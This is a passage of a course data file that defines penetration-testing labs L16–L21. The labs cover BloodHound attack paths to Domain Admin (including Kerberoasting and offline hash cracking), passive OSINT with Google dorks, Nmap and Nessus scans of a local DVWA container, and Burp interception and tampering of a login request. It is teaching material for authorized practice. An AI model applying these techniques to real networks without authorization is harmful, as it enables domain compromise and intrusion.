      "Don't forget the annotation layer on top of the topology — label IAM/MFA at the access edge, micro-segmentation between VLANs, and IDS/IPS/WAF at the DMZ/perimeter, then add flow labels like 'DMZ -> Internal: denied except port 443 to app tier'.",
    ],
  },
  {
    id: "L16",
    number: 16,
    week: 6,
    moduleId: "m6",
    title: "BloodHound: view AD graph, find path to Domain Admin",
    description:
      "BloodHound is the single tool that turns 'we popped one workstation' into 'we own the domain' in real Active Directory engagements, and this lab has you read its attack-path graph the way a red teamer does. You'll stand up BloodHound Community Edition via Docker, ingest SpecterOps' official sample dataset, and run the built-in 'Shortest Paths to Domain Admins' query to see the full chain from a low-privilege account to Domain Admin. Walking each edge — MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword — you'll tie ACL-type edges directly to the misconfigured-ACL privilege-escalation vector, and flag any Kerberoastable account whose service ticket could be cracked offline with Hashcat or John the Ripper without ever touching a login prompt. You finish able to read a BloodHound graph cold, name the exact relationship type behind each hop, and identify the single cheapest edge that — if removed — would break the entire path to Domain Admin.",
    objective:
      "Stand up BloodHound CE, ingest the official sample AD dataset, run 'Shortest Paths to Domain Admins', and walk each edge to identify the single relationship that, if removed, breaks the path.",
    successCriteria: [
      "BloodHound graph screenshot shows the 'Shortest Paths to Domain Admins' path highlighted node-to-node with each edge's relationship type visible",
      "Each edge type named (MemberOf, AdminTo, GenericAll, etc.) and any ACL-type edge flagged as the misconfigured-ACL privesc vector",
      "Any Kerberoastable account in the path identified",
      "A written summary names the single relationship whose removal would break the chain to Domain Admin",
    ],
    platform: "BloodHound",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      "Install Docker Desktop (or Docker Engine + Compose), then stand up BloodHound CE with the official one-liner: curl -L https://ghst.ly/getbhce | docker compose -f - up",
      "Watch the container logs for the randomly generated initial admin password, then log in at http://localhost:8080/ui/login",
      "Download the official sample dataset from the BloodHound CE 'Ingest Sample Data' docs page",
      "In the BloodHound UI, go to Administration -> File Ingest (or the Upload Files modal), drag in the sample data ZIP, and click Upload",
      "Wait for ingestion to finish, then open Analysis (or Cypher Search) and run the pre-built 'Shortest Paths to Domain Admins' query",
      "Click through the resulting graph edge by edge, noting each relationship type (MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword, etc.)",
      "For any ACL-type edge (GenericAll, ForceChangePassword, WriteDacl, etc.) in the path, note that this is exactly the 'misconfigured ACL' privilege-escalation vector: attackers manipulate these permissions to gain unauthorized access or escalate privileges within the domain",
      "Check whether any account in the path is flagged as Kerberoastable — in a real engagement this account's service ticket would be requested from AD and cracked offline with Hashcat or John the Ripper to recover its password without touching a login prompt",
      "Identify the single cheapest/most-likely-to-be-missed edge in the path (e.g. a nested group membership or a GenericAll ACE)",
      "Write a short summary of the attack path found and which single relationship, if removed, would break the chain to Domain Admin",
    ],
    resources: [
      {
        title: "BloodHound CE Quickstart (SpecterOps)",
        url: "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart",
        type: "link",
      },
      {
        title: "BloodHound CE: Ingest Sample Data",
        url: "https://bloodhound.specterops.io/get-started/quickstart/ce-ingest-sample-data",
        type: "link",
      },
      {
        title: "BloodHound Example Data (GitHub wiki)",
        url: "https://github.com/SpecterOps/BloodHound/wiki/Example-Data",
        type: "link",
      },
      {
        title: "BloodHound docker-compose example (GitHub)",
        url: "https://github.com/SpecterOps/BloodHound/tree/main/examples/docker-compose",
        type: "link",
      },
      {
        title: "TryHackMe: Active Directory Basics",
        url: "https://tryhackme.com/room/winadbasics",
        type: "platform",
      },
    ],
    completionIndicator: `BloodHound graph screenshot showing the 'Shortest Paths to Domain Admins' query results with the full path highlighted node-to-node and every edge's relationship type visible`,
    slides: [
      {
        title: "Stand up BloodHound CE",
        body: "Install Docker, then bring up BloodHound Community Edition with the official one-liner (curl -L https://ghst.ly/getbhce | docker compose -f - up) and watch the container logs for the randomly generated initial admin password.",
        diagram: {
          type: "container-arch",
          hostLabel: "Your machine (localhost:8080)",
          containerLabel: "BloodHound CE (docker compose stack)",
          image: "ghst.ly/getbhce compose bundle",
          hostPort: 8080,
          containerPort: 8080,
        },
      },
      {
        title: "Log in and ingest the sample dataset",
        body: "Log in at http://localhost:8080/ui/login with the generated admin password, download SpecterOps' official sample AD dataset, then drag the ZIP into the File Ingest / Upload Files modal and wait for ingestion to finish.",
        diagram: {
          type: "browser-mockup",
          url: "http://localhost:8080/ui/login",
          annotations: [
            {
              label: "Administration > File Ingest",
              note: "Upload the official sample dataset ZIP",
            },
          ],
        },
      },
      {
        title: "Run 'Shortest Paths to Domain Admins'",
        body: "Open Analysis (or Cypher Search) and run the pre-built 'Shortest Paths to Domain Admins' query, then click through the resulting graph edge by edge, noting each relationship type — MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword.",
        diagram: {
          type: "graph-tree",
          nodes: [
            {
              id: "user",
              label: "Compromised user",
            },
            {
              id: "grp",
              label: "IT Support (group)",
            },
            {
              id: "admin",
              label: "Server Admins (group)",
            },
            {
              id: "da",
              label: "Domain Admins",
              highlighted: true,
            },
          ],
          edges: [
            {
              from: "user",
              to: "grp",
              label: "MemberOf",
            },
            {
              from: "grp",
              to: "admin",
              label: "GenericAll",
            },
            {
              from: "admin",
              to: "da",
              label: "AdminTo",
            },
          ],
        },
      },
      {
        title: "Spot the misconfigured ACL and Kerberoastable accounts",
        body: "Any ACL-type edge in the path — GenericAll, ForceChangePassword, WriteDacl — is the misconfigured-ACL privilege-escalation vector where attackers manipulate permissions to gain access or elevate privileges. Also check whether any account in the path is flagged Kerberoastable, meaning its service ticket could be requested from AD and cracked offline with Hashcat or John the Ripper.",
      },
      {
        title: "Find the cheapest edge to break the chain",
        body: "Identify the single cheapest or most-likely-to-be-missed edge in the path — often a nested group membership or a lone GenericAll ACE — and write a short summary of which single relationship, if removed, would break the chain to Domain Admin.",
      },
      {
        title: "What you just proved",
        body: "You traced a real attack path — MemberOf into a misconfigured GenericAll ACE into AdminTo Domain Admin — the exact kind of chain that turns one compromised low-privilege account into full domain compromise in real incidents. Naming which relationship type sits on each edge, and identifying the one link that would break the chain if removed, is what separates reading a BloodHound graph from just staring at one.",
      },
    ],
    hints: [
      "Can't find your admin password to log in? Check the container logs after running the docker compose one-liner — the initial password is randomly generated and printed there.",
      "Once the sample data is ingested, you don't need to build the path yourself — use the pre-built query in Analysis (or Cypher Search) called 'Shortest Paths to Domain Admins'.",
      "When walking the graph edge by edge, pay close attention to any ACL-type edge (GenericAll, ForceChangePassword, WriteDacl) — that's the misconfigured-ACL privilege-escalation vector, and it's usually the cheapest link worth flagging as the one that would break the chain if removed.",
    ],
  },
  {
    id: "L17",
    number: 17,
    week: 7,
    moduleId: "m7",
    title: "Passive OSINT on a test domain",
    description:
      "Every real engagement's Rules of Engagement draws a hard line between passive recon — which never touches the target — and active scanning, which does, and blurring that line is one of the fastest ways to violate scope. This lab keeps you strictly on the passive side: pull registrar and nameserver data from WHOIS, harvest subdomains from crt.sh's Certificate Transparency logs, check Shodan's own pre-existing index for internet-facing hosts, fingerprint the hosting stack with Netcraft's Site Report, run Google Dorks for exposed documents, and query DNS records through a public resolver instead of the target's own server. Compiling all of it into one passive-recon report — and flagging exactly which findings would need active verification later — mirrors the deliverable a client actually receives before active testing is authorized. You walk away able to build a target's external footprint from public sources alone, and to articulate why each technique stayed passive.",
    objective:
      "Build a passive-recon report on a test domain using only third-party sources — WHOIS, crt.sh, Shodan, Netcraft, Google Dorks, and public DNS resolvers — never touching the target directly.",
    successCriteria: [
      "Report compiles WHOIS, crt.sh subdomains, Shodan results, Netcraft site report, at least 3 Google Dork results, and DNS (A/MX/TXT/NS) lookups",
      "All DNS queries directed at a public resolver, not the target's own nameserver",
      "Findings that would require active verification are flagged with why they can't be confirmed passively",
    ],
    platform: "OSINT Framework",
    difficulty: "easy",
    estimatedHours: 3,
    instructions: [
      `Run a WHOIS lookup on the target domain (whois target.com) to record registrar, creation date, and nameserver details`,
      `Search crt.sh for the domain (https://crt.sh/?q=target.com) to enumerate subdomains from Certificate Transparency logs, without touching the target directly`,
      `Search Shodan for hostname:"target.com" to enumerate internet-facing hosts/services already indexed by Shodan's own scanning`,
      `Use Netcraft's Site Report tool (https://sitereport.netcraft.com) to identify hosting provider, technology stack, and OS fingerprint`,
      `Run at least 3 Google Dork queries (e.g. site:target.com filetype:pdf, site:target.com intitle:"index of") to find exposed documents/directories`,
      `Check DNS records (A, MX, TXT, NS) with dig/nslookup against a public resolver, not the target's own DNS server`,
      `Compile all findings into a short passive-recon report: registrar/hosting, subdomains found, technologies fingerprinted, and any exposed documents`,
      `Flag anything that would need active verification later, and explain why it can't be confirmed passively`,
    ],
    resources: [
      {
        title: "OSINT Framework",
        url: "https://osintframework.com",
        type: "link",
      },
      { title: "Shodan", url: "https://www.shodan.io", type: "tool" },
      {
        title: "crt.sh Certificate Transparency search",
        url: "https://crt.sh",
        type: "tool",
      },
      {
        title: "Netcraft Site Report",
        url: "https://sitereport.netcraft.com",
        type: "tool",
      },
    ],
    completionIndicator: `passive-recon report showing WHOIS output, crt.sh subdomain results, Shodan results, Netcraft site report, at least 3 Google Dork results, and DNS record lookups all compiled together`,
    slides: [
      {
        title: "Passive-only ground rules",
        body: "Passive OSINT means gathering data about the target only through third-party sources — WHOIS, Certificate Transparency logs, Shodan's own indexed scans, Netcraft, Google, and public DNS resolvers — without ever sending a packet directly to the target.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "you",
              label: "You",
              kind: "attacker",
            },
            {
              id: "osint",
              label: "WHOIS / crt.sh / Shodan / Netcraft",
              kind: "server",
            },
            {
              id: "target",
              label: "target.com",
              kind: "victim",
            },
          ],
          edges: [
            {
              from: "you",
              to: "osint",
              label: "query public sources",
            },
            {
              from: "osint",
              to: "target",
              label: "no direct packets",
              dashed: true,
            },
          ],
        },
      },
      {
        title: "WHOIS lookup",
        body: "Run a WHOIS lookup on the target domain to record registrar, creation date, and nameserver details.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "whois target.com",
            },
            {
              output: "Registrar: ...\nCreation Date: ...\nName Server: ...",
            },
          ],
        },
      },
      {
        title: "Certificate Transparency and Shodan",
        body: 'Search crt.sh for the domain to enumerate subdomains from Certificate Transparency logs, and search Shodan for hostname:"target.com" to see internet-facing hosts already indexed by Shodan\'s own scanning — neither touches the target directly.',
        diagram: {
          type: "browser-mockup",
          url: "https://crt.sh/?q=target.com",
          annotations: [
            {
              label: "crt.sh results",
              note: "Subdomains harvested from CT logs, no packets to target",
            },
            {
              label: "Shodan hostname search",
              note: "Uses Shodan's pre-existing index, not a live scan by you",
            },
          ],
        },
      },
      {
        title: "Netcraft fingerprint and Google Dorks",
        body: "Use Netcraft's Site Report to identify hosting provider, technology stack, and OS fingerprint, then run at least 3 Google Dork queries such as site:target.com filetype:pdf to find exposed documents or directories.",
        diagram: {
          type: "browser-mockup",
          url: "https://sitereport.netcraft.com",
          annotations: [
            {
              label: "Site Report",
              note: "Hosting provider, tech stack, OS fingerprint",
            },
            {
              label: "Google Dorks",
              note: 'site:target.com filetype:pdf / intitle:"index of"',
            },
          ],
        },
      },
      {
        title: "DNS records via a public resolver",
        body: "Check A, MX, TXT, and NS records with dig or nslookup against a public resolver, not the target's own DNS server, to keep the lookup passive.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "dig target.com MX +short @8.8.8.8",
            },
            {
              output: "10 mail.target.com.",
            },
          ],
        },
      },
      {
        title: "Compile the report and flag active-only items",
        body: "Compile all findings into a short passive-recon report — registrar/hosting, subdomains found, technologies fingerprinted, exposed documents — and flag anything that would need active verification later, explaining why it can't be confirmed passively.",
      },
      {
        title: "Why this matters",
        body: "Everything you gathered — registrar data, subdomains from CT logs, Shodan's index, Netcraft's fingerprint, Google Dork hits, DNS records — came from public sources, with zero packets sent to the target, which is exactly the boundary a real Rules of Engagement enforces before active testing is authorized. You now know how to build a target's external footprint from open sources alone, and to flag what still needs active confirmation instead of guessing.",
      },
    ],
    hints: [
      "Look back at the DNS step near the end of the instructions -- something about which server you query matters for staying passive.",
      "The A/MX/TXT/NS lookups need to go through a public resolver, not whichever DNS server the target itself runs -- querying the target's own nameserver would count as touching the target directly.",
      "Run dig or nslookup for the A, MX, TXT, and NS records, but explicitly point the query at a public resolver instead of letting it default to the target's own DNS server.",
    ],
  },
  {
    id: "L18",
    number: 18,
    week: 7,
    moduleId: "m7",
    title: "Nmap: 5 scan types on a local Docker target",
    description:
      "Host discovery, port scanning, service/version detection, default-script/NSE enumeration, and HTTP-specific scripting are the moves every engagement's recon phase runs before anyone touches an exploit, and Nmap does all of them from one binary. Working against a DVWA container the portal starts for you and maps to localhost:18080, you'll run -sn to confirm the host is live, -p- for a full 65535-port sweep, -sV for service/version banners, -sC for Nmap's default script set, and --script http-enum/http-headers for HTTP-specific NSE checks against the open web service. Saving each run with -oN builds the same paper trail a real report is built from: open ports, banners, and any interesting HTTP details the scripts flag. You leave with the core Nmap recon workflow committed to muscle memory, ready to point at any future authorized target.",
    objective:
      "Run Nmap's five recon scan types — host discovery, full port scan, version detection, default-script scan, and HTTP NSE scripts — against a locally-started DVWA container and save a paper trail for each.",
    successCriteria: [
      "5 saved -oN output files: host discovery, full port scan, version detection, default-script scan, and HTTP NSE results against the same local target",
      "-sV and the HTTP NSE scripts run against the actual open port found by the full port sweep",
      "Every open port, service/version banner, and any interesting HTTP detail documented",
    ],
    platform: "In-House Docker Range",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above to launch the DVWA container, then confirm your target is localhost:18080 — a target you started yourself, so there's no scan-rate limit or authorization to arrange`,
      `Host discovery: nmap -sn localhost to confirm the host is live`,
      `Full TCP port scan across all 65535 ports: sudo nmap -p- -T4 localhost`,
      `Version detection against the discovered open port: nmap -sV -p<open-ports> localhost`,
      `Default-script scan (Nmap's -sC safe script set) against the same ports: nmap -sC -p<open-ports> localhost`,
      `HTTP-specific NSE scripts against the web service: nmap --script http-enum,http-headers -p18080 localhost`,
      `Save all 5 outputs with -oN <name>.txt so you have a paper trail per scan type`,
      `Document every open port, service/version banner, and any interesting HTTP detail flagged by the default and http-* scripts`,
    ],
    resources: [
      {
        title: "Nmap official docs (Reference Guide)",
        url: "https://nmap.org/book/man.html",
        type: "link",
      },
      {
        title: "Nmap NSE http category docs",
        url: "https://nmap.org/nsedoc/categories/http.html",
        type: "link",
      },
      {
        title: "Nmap NSE default category docs",
        url: "https://nmap.org/nsedoc/categories/default.html",
        type: "link",
      },
      {
        title:
          "scanme.nmap.org — Nmap's own authorized public target (optional extra practice)",
        url: "https://scanme.nmap.org",
        type: "platform",
      },
    ],
    completionIndicator: `5 saved terminal/log files (-oN outputs) showing host discovery, full port scan, version detection, default-script scan, and HTTP NSE script results all run against localhost:18080`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Start the lab and confirm your target",
        body: "Click 'Start Lab' to launch the DVWA container, then confirm your target is localhost:18080 — a target you started yourself, so there's no scan-rate limit, VPN, or authorization to arrange.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Host discovery",
        body: "Confirm the host is live with a ping-style discovery scan: nmap -sn localhost.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "nmap -sn localhost",
            },
            {
              output: "Host is up (0.00031s latency).",
            },
          ],
        },
      },
      {
        title: "Full TCP port scan",
        body: "Scan all 65535 TCP ports rather than just the default top-1000: sudo nmap -p- -T4 localhost.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "sudo nmap -p- -T4 localhost",
            },
            {
              output: "18080/tcp open http-proxy",
            },
          ],
        },
      },
      {
        title: "Version detection and the default script set",
        body: "Grab service/version banners on the discovered open port with nmap -sV -p<open-ports>, then run Nmap's default safe script set against the same port with nmap -sC.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "nmap -sV -p18080 localhost",
            },
            {
              command: "nmap -sC -p18080 localhost",
            },
            {
              output: "18080/tcp open http Apache httpd 2.4",
            },
          ],
        },
      },
      {
        title: "HTTP-specific NSE scripts",
        body: "Run the http-enum and http-headers NSE scripts against the web service to enumerate common paths and read response headers: nmap --script http-enum,http-headers -p18080 localhost.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "nmap --script http-enum,http-headers -p18080 localhost",
            },
          ],
        },
      },
      {
        title: "Save and document every scan",
        body: "Save all 5 outputs with -oN <name>.txt so there's a paper trail per scan type, then document every open port, service/version banner, and any interesting HTTP detail the scripts flagged.",
      },
      {
        title: "Why this matters",
        body: "Host discovery, full port sweeps, version detection, default-script scans, and HTTP-specific NSE scripts are the same five Nmap moves that open nearly every real penetration test, and you just ran all five against a target you control end to end, with a saved paper trail for each. That scan-save-document workflow is what you'll repeat on the very first day of any future authorized engagement.",
      },
    ],
    hints: [
      "Look at the order of the scan steps -- the version-detection and HTTP-script steps aren't meant to run blind, they depend on something from an earlier scan.",
      "Both the -sV scan and the http-* scripts expect you to fill in the actual open ports, not scan everything again -- that list comes from your full TCP port scan.",
      "Take the open port reported by your full port sweep (sudo nmap -p- -T4 localhost) and plug that exact port number into the -p<open-ports> slot for the -sV, -sC, and --script http-enum,http-headers scans.",
    ],
  },
  {
    id: "L19",
    number: 19,
    week: 7,
    moduleId: "m7",
    title: "Nessus: install & scan a local Docker target",
    description:
      "A vulnerability scanner like Nessus can surface in minutes what would take far longer to enumerate manually with Nmap alone — but only if you know how to triage the flood of findings it returns by severity before acting on any of them. Nessus Essentials is a free tool you install locally (no external account beyond a one-time activation email, and no cloud target required), and here you'll point it at a DVWA container the portal starts for you on localhost:18080. Once the scan completes, you'll group the results by Critical/High/Medium/Low, then pull the top 3 findings, look up each one's CVE, and write remediation guidance for it — the exact triage step that separates a scan report from an actionable one. You finish able to run and interpret a full Nessus scan end to end, and to prioritize findings the way a real assessment does.",
    objective:
      "Install Nessus Essentials, run a Basic Network Scan against a locally-started DVWA container, then triage the findings by severity and research the top three.",
    successCriteria: [
      "Nessus results screen shows the completed scan grouped by Critical/High/Medium/Low with the top 3 findings and CVE IDs visible",
      "The scan targeted localhost:18080, the local DVWA container started from the portal",
      "One paragraph per top-3 finding covering its CVE and remediation guidance",
    ],
    platform: "Nessus Essentials",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Register for a free Nessus Essentials activation code at tenable.com/products/nessus/nessus-essentials and check email for the code`,
      `Download and install Nessus for your OS, then complete setup at https://localhost:8834, entering the activation code when prompted`,
      `Click 'Start Lab' above to launch the DVWA container, and confirm it's reachable at http://localhost:18080`,
      `In Nessus, click New Scan -> Basic Network Scan, name it, and set the target to localhost:18080`,
      `Launch the scan and wait for it to complete (a single small container typically finishes in a few minutes)`,
      `Review results grouped by severity (Critical/High/Medium/Low) in the scan's Vulnerabilities tab`,
      `Pick the top 3 findings by severity, look up each one's corresponding CVE and remediation guidance, and write one paragraph per finding`,
    ],
    resources: [
      {
        title: "Nessus Essentials (free)",
        url: "https://www.tenable.com/products/nessus/nessus-essentials",
        type: "tool",
      },
      {
        title: "Tenable Nessus install/activation docs",
        url: "https://docs.tenable.com/nessus/Content/InstallNessusEssentialsProfessionalExpertOrManager.htm",
        type: "link",
      },
      {
        title: "Tenable: Manage Activation Code",
        url: "https://docs.tenable.com/nessus/Content/ManageActivationCode.htm",
        type: "link",
      },
    ],
    completionIndicator: `Nessus scan results screen showing the completed Basic Network Scan against localhost:18080 grouped by severity (Critical/High/Medium/Low), with the top 3 findings' names and CVE IDs visible`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Install and activate Nessus",
        body: "Register for a free Nessus Essentials activation code, install Nessus, then complete setup at https://localhost:8834, entering the activation code when prompted.",
        diagram: {
          type: "browser-mockup",
          url: "https://localhost:8834",
          annotations: [
            {
              label: "Activation code",
              note: "From the free Nessus Essentials registration email",
            },
          ],
        },
      },
      {
        title: "Start the local DVWA target",
        body: "Click 'Start Lab' above to launch the DVWA container and confirm it's reachable at http://localhost:18080 before configuring the scan.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Configure and launch a Basic Network Scan",
        body: "In Nessus, click New Scan -> Basic Network Scan, name it, set the target to localhost:18080, then launch it and wait for it to complete.",
        diagram: {
          type: "browser-mockup",
          url: "https://localhost:8834",
          annotations: [
            {
              label: "New Scan > Basic Network Scan",
              note: "Target: localhost:18080",
            },
          ],
        },
      },
      {
        title: "Triage results by severity",
        body: "Review the completed scan's Vulnerabilities tab grouped by severity — Critical, High, Medium, Low — before deciding what to investigate first.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Scan completes",
            },
            {
              label: "Group by severity",
              detail: "Critical / High / Medium / Low",
            },
            {
              label: "Pick top 3 findings",
            },
            {
              label: "Look up CVE + remediation",
            },
          ],
        },
      },
      {
        title: "Research the top findings",
        body: "Pick the top 3 findings by severity, look up each one's corresponding CVE and remediation guidance, and write one paragraph per finding.",
      },
      {
        title: "Why this matters",
        body: "Nessus found in minutes what would take far longer to enumerate manually with Nmap alone, but the scan itself was the easy part — triaging Critical/High/Medium/Low findings and researching the CVEs behind the top 3 is what turns a wall of alerts into an actionable report. That severity-first triage habit is exactly what real vulnerability management programs run on.",
      },
    ],
    hints: [
      "Before you configure the scan, double check the DVWA container is actually running -- click 'Start Lab' above and confirm http://localhost:18080 loads first.",
      "The scan target is localhost:18080 itself, not an IP you need to discover -- the portal already mapped the container's internal port 80 there for you.",
      "If the scan comes back empty or errors out, re-check that the container is still running (it can be restarted from the lab's Start/Stop controls) before re-launching the Nessus scan.",
    ],
  },
  {
    id: "L20",
    number: 20,
    week: 8,
    moduleId: "m8",
    title: "Step-by-step Burp Suite setup",
    description:
      "Every professional web app pentest begins the same way: an intercepting proxy sitting between the browser and the target, decrypting HTTPS on the fly so every request can be seen and edited before it leaves the machine. This lab builds that exact setup — Burp Suite Community Edition routed through Firefox via FoxyProxy, with Burp's CA certificate trusted so HTTPS traffic decrypts cleanly with no browser warnings. It is infrastructure, not a warm-up: every later lab in this course (L21 through L32) and every real engagement assumes this proxy chain already works. You walk away able to stand up a working intercept setup from scratch and prove it with a captured HTTPS request in Proxy > HTTP history.",
    objective:
      "Stand up a working Burp Suite intercepting proxy — routed through Firefox via FoxyProxy with Burp's CA certificate trusted — and prove it by capturing a clean HTTPS request.",
    successCriteria: [
      "Burp Proxy > HTTP history screenshot shows a captured HTTPS request (status 200) to a real site",
      "Firefox routes through FoxyProxy to Burp's 127.0.0.1:8080 listener",
      "Burp's CA cert imported and trusted so HTTPS loads with no certificate warning",
    ],
    platform: "Burp Suite",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      `Download and install Burp Suite Community Edition from portswigger.net/burp/communitydownload`,
      `Launch Burp, accept the license, choose 'Temporary project' and 'Use Burp defaults', then click Start Burp`,
      `In Burp go to Proxy > Proxy settings and confirm a proxy listener is running on 127.0.0.1:8080`,
      `In Firefox, install the 'FoxyProxy Standard' extension from addons.mozilla.org`,
      `In FoxyProxy's options, add a new proxy titled 'Burp' with IP 127.0.0.1 and port 8080, save it, then click the FoxyProxy toolbar icon and select it to route all Firefox traffic through Burp`,
      `With FoxyProxy enabled, browse to http://burp (or http://127.0.0.1:8080) and click 'CA Certificate' in the top-right to download cacert.der`,
      `In Firefox go to Settings > Privacy & Security > Certificates > View Certificates > Authorities tab > Import, select cacert.der, and check 'Trust this CA to identify websites'`,
      `In Burp, go to Proxy > Intercept and confirm 'Intercept is off' so traffic flows through passively for this test`,
      `Browse to any HTTPS site in the FoxyProxy-enabled Firefox and confirm the padlock shows no warning and the request appears in Proxy > HTTP history`,
      `Screenshot Burp's HTTP history showing at least one captured HTTPS request/response pair as evidence of a working intercept setup`,
    ],
    resources: [
      {
        title: "Burp Suite Community Edition download",
        url: "https://portswigger.net/burp/communitydownload",
        type: "tool",
      },
      {
        title: "PortSwigger: Installing Burp's CA certificate in Firefox",
        url: "https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox",
        type: "link",
      },
      {
        title: "PortSwigger: Configuring Firefox to work with Burp",
        url: "https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox",
        type: "link",
      },
      {
        title: "FoxyProxy Standard (Firefox add-on)",
        url: "https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/",
        type: "tool",
      },
      {
        title: "PortSwigger Web Academy",
        url: "https://portswigger.net/web-security",
        type: "platform",
      },
    ],
    completionIndicator: `Screenshot of Burp Suite's Proxy > HTTP history tab showing a captured HTTPS request (status 200) to a real site, taken with FoxyProxy enabled in Firefox and no 'certificate not trusted' warning displayed.`,
    slides: [
      {
        title: "Install Burp and confirm the listener",
        body: "Burp Suite Community Edition is downloaded and launched with a Temporary project and Burp's defaults, then Proxy > Proxy settings is checked to confirm a listener is actually running on 127.0.0.1:8080 -- the address FoxyProxy will be pointed at next.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Download Burp Suite CE",
              detail: "portswigger.net/burp/communitydownload",
            },
            {
              label: "Launch Burp",
              detail: "Temporary project, Use Burp defaults, click Start Burp",
            },
            {
              label: "Verify the listener",
              detail: "Proxy > Proxy settings shows 127.0.0.1:8080 running",
            },
          ],
        },
      },
      {
        title: "Route Firefox through Burp",
        body: "Burp's proxy listener runs on 127.0.0.1:8080 by default; FoxyProxy is added as a new profile pointing at that same IP and port so all Firefox traffic gets routed through Burp before it leaves the machine.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "firefox",
              label: "Firefox + FoxyProxy",
              kind: "attacker",
            },
            {
              id: "burp",
              label: "Burp Proxy 127.0.0.1:8080",
              kind: "device",
            },
            {
              id: "web",
              label: "Any HTTPS site",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "firefox",
              to: "burp",
              label: "routed via FoxyProxy",
            },
            {
              from: "burp",
              to: "web",
              label: "forwarded request",
            },
          ],
        },
      },
      {
        title: "Trust Burp's CA certificate",
        body: "Browsing to http://burp downloads cacert.der, which is imported under Firefox Settings > Privacy & Security > Certificates > Authorities with 'Trust this CA to identify websites' checked -- this is what lets Burp decrypt HTTPS without triggering certificate warnings.",
        diagram: {
          type: "browser-mockup",
          url: "about:preferences#privacy",
          annotations: [
            {
              label: "Authorities tab",
              note: "Import cacert.der, check 'Trust this CA to identify websites'",
            },
            {
              label: "Result",
              note: "HTTPS sites load with no certificate warning while FoxyProxy is enabled",
            },
          ],
        },
      },
      {
        title: "Confirm the intercept works",
        body: "With Intercept off (Proxy > Intercept), traffic flows passively; browsing to any HTTPS site should show a clean padlock and the request/response pair should appear in Proxy > HTTP history as proof the whole chain works end to end.",
        diagram: {
          type: "request-response",
          leftLabel: "Firefox (via FoxyProxy)",
          rightLabel: "HTTPS site",
          exchanges: [
            {
              direction: "right",
              label: "GET / over HTTPS",
              payload: "decrypted and logged by Burp",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "captured in Proxy > HTTP history",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Every real web app pentest engagement starts with exactly this: a working intercepting proxy and a trusted CA cert are non-negotiable infrastructure, not busywork. Without this setup working end to end, Proxy history, Repeater, and Intruder in every later lab in this course are simply unavailable to you.",
      },
    ],
    hints: [
      "If HTTPS sites throw a certificate warning even with FoxyProxy routing traffic through Burp, revisit the steps right after setting up the FoxyProxy profile.",
      "Getting a clean padlock requires trusting Burp's own CA certificate in Firefox, not just proxying traffic through Burp -- there's a specific file you need to download and import.",
      "Browse to http://burp, download cacert.der from the CA Certificate link, then import it under Firefox Settings > Privacy & Security > Certificates > View Certificates > Authorities > Import, checking 'Trust this CA to identify websites'.",
    ],
  },
  {
    id: "L21",
    number: 21,
    week: 8,
    moduleId: "m8",
    title: "Burp Intercept: capture login request on DVWA",
    description:
      "A login form's HTML only constrains what a browser will submit -- it does nothing to stop a request from being rewritten in flight, which is exactly how parameter-tampering and business-logic bugs get found on real engagements. This lab stands up DVWA in Docker, switches Burp's Intercept on, and catches the raw login POST -- username, password, and PHPSESSID cookie -- before it ever reaches the server, then edits the password parameter directly and forwards the tampered version. Comparing that against a normal pass-through request with Intercept off makes the lesson concrete: the server trusts whatever arrives on the wire, not what the form UI implies. You leave with the core proxy workflow every later attack in this course -- SQLi, XSS, IDOR -- depends on: intercept, edit, forward.",
    objective:
      "Run DVWA, use Burp Intercept to capture the raw login POST, edit the password parameter in flight, and forward the tampered request to prove the server trusts what arrives on the wire.",
    successCriteria: [
      "Burp Proxy > Intercept screenshot shows the raw DVWA login POST with the password parameter visibly edited before Forward",
      "The intercepted request contains the username, password, and PHPSESSID cookie",
      "The intercepted/tampered request compared against a normal Intercept-off pass-through",
    ],
    platform: "Burp Suite / DVWA",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      `Pull and run the DVWA container: docker run -d --name dvwa -p 8080:80 ghcr.io/digininja/dvwa:latest`,
      `Browse to http://localhost:8080, click 'Create / Reset Database', and wait for setup to finish`,
      `Log in with the default credentials admin / password`,
      `Go to DVWA Security (left nav) and set Security Level to Low, then click Submit`,
      `With FoxyProxy enabled and Burp's Proxy > Intercept switched to 'Intercept is on', log out and resubmit the DVWA login form`,
      `Observe the captured raw POST request in Burp, including the username and password parameters and the PHPSESSID cookie`,
